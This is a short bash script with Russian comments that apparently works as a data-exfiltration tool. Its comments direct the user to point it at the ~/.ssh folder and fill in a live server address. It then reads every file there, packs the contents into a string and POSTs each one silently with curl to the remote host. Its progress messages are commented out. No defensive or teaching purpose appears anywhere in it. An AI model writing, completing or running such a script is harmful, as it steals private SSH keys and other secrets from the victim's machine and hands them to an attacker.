#!/bin/bash

FOLDER="$HOME/" # ПОДМЕНИТЬ НА .ssh !!!
SERVER="" # ЗАМЕНИТЬ НА АДРЕС АКТУАЛЬНЫЙ !!!

if [ ! -d "$FOLDER" ]; then 
    #echo "Ошибка: Папка $FOLDER не существует!" 
    exit 1
 fi

process_file() { 
    local file="$1" 
    local filename=$(basename "$file") 
    local content
    
    content=$(< "$file" sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\$/\\$/g')
    
    echo "\"$filename\":\"$content\""
}

find "$FOLDER" -type f -print0 | while IFS= read -r -d $'\0' file; do

    data=$(process_file "$file")
    
    #echo "Отправка $file..." 
    curl -X POST "$SERVER" -d "$data" --silent
    
    # Можно добавить задержку между запросами при необходимости sleep 0.1
done
#echo "Завершено! Все файлы из $FOLDER отправлены на $SERVER"
